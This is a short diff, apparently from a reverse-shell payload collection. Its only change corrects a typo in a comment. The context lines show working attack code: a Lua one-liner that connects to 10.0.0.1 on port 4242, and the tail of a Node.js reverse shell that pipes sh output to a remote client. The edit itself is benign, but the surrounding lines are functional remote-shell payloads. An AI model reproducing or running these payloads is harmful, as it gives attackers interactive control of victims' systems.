@@ -343,7 +343,7 @@ lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") 
         sh.stdout.pipe(client);
         sh.stderr.pipe(client);
     });
-    return /a/; // Prevents the Node.js application form crashing
+    return /a/; // Prevents the Node.js application from crashing
 })();
 
 
